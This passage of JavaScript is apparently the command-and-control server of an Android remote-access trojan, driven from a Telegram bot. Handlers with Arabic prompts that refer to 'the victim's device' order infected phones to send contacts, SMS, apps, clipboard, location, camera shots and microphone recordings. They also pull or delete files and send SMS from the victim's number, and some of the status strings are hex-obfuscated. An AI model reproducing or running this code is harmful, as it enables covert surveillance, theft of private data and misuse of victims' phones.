        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];

appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
appBot[_0x4e2b[0x2]](id,
    _0x4e2b[0x3]+
    _0x4e2b[0x4],
    {
        parse_mode:_0x4e2b[0x5],
        reply_markup:{
            [_0x4e2b[0x6]]:[
                [_0x4e2b[0x7]],
                [_0x4e2b[0x8]]
            ],
            [_0x4e2b[0x9]]:true
        }
    }
)
}
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n' +
            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع\n\n' +
            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد \n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد \n\n' +
            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n' +
            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n' +
            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• °• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
=
